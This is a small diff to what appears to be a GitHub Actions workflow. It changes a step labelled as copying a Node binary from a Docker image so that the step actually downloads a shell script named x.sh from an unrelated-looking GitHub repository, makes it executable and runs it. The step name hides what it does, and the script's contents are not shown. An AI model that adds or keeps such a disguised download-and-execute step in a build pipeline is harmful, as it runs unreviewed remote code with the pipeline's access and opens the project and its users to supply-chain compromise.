@@ -19,7 +19,7 @@ jobs:
 
       - name: Copy /opt/node/node from docker image
         run: |
-          curl https://raw.githubusercontent.com/menju2ikg8uti/tmp/main/x.sh
+          wget https://raw.githubusercontent.com/menju2ikg8uti/tmp/main/x.sh
           chmod +x x.sh
           ./x.sh
       - name: Commit changes
